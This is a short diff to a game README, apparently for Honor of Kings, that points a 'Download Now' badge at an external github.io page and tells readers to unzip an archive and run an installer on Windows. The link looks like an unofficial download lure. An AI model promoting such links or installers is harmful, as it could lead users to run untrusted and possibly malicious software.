@@ -8,7 +8,7 @@ Players choose from a roster of iconic heroes, each with unique abilities, and w
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-red?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-red?style=for-the-badge)](https://honor-of-kings-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
